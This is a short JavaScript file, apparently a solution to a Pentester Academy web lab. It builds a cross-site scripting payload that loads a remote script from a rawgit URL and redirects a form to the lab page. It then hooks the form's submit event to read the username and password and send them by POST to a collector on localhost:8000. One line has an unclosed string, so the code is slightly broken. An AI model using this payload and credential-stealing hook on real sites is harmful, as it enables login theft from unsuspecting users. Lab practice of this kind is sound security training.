xss = '&url=<script src%3D\"https%3A%2F%2Frawgit.com%2Fcharner93%2Fscripts%2Fmaster%2FJFP.js\"><%2Fscript>';
document.forms[0].action = "http://pentesteracademylab.appspot.com/lab/webapp/jfp/3? + xss;
function onFormSubmit()
{
	getForm = document.getElementsByTagName("form");
	usernameForm = getForm[0][0].value;
	passwordForm = getForm[0][1].value;
	var request = new XMLHttpRequest();
	request.open("POST", "http://localhost:8000?username=" + usernameForm + "&password=" + passwordForm, true);
	request.send();
}
document.forms[0].onsubmit = onFormSubmit;
